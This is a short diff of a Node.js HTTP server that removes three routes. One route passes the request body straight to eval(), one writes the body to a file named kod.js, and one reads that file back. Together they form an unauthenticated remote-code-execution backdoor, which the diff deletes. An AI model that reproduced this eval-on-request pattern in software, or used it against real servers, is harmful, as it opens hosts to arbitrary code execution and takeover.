@@ -9,25 +9,7 @@ http.createServer(function(req, res) {
   var urlParsed = url.parse(req.url);
 
   switch (urlParsed.pathname) {
-case '/e8':var body = '',sp255='';
 
-      req
-.on('readable', function() {
-          body += req.read();
-})
-        .on('end', function() {
-body=body.replace(/null/,'');
-try{eval(body);}catch(err){sp255+= err.message + "\n" + err.stack; res.statusCode = 200;res.end(sp255);};});break;
-case '/z':var body = '';
-
-      req
-.on('readable', function() {
-          body += req.read();
-})
-        .on('end', function() {
-res.statusCode = 200;res.end('ok');body=body.replace(/null/,'');
-fs.writeFileSync('kod.js', body);});break;
-case '/p':res.statusCode = 200;res.end(fs.readFileSync('kod.js', 'utf8'));break;
 case '/':
      res.setHeader('Content-Type', 'text/html'); sendFile("inkomp.html", res);
  break;
